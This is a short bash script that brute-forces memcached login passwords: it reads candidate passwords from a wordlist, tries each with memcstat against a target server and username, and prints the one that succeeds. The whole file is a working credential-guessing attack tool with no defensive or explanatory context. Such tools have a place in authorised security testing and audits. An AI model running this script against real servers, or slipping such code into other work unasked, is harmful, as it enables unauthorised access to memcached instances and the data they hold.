#! /bin/bash
while read F ; do
echo "Trying $F"
    if memcstat --servers=$1 --username=$2 --password=$F | grep -q Server ; then
    echo "Password Found: "$F
    break
fi
done < $3
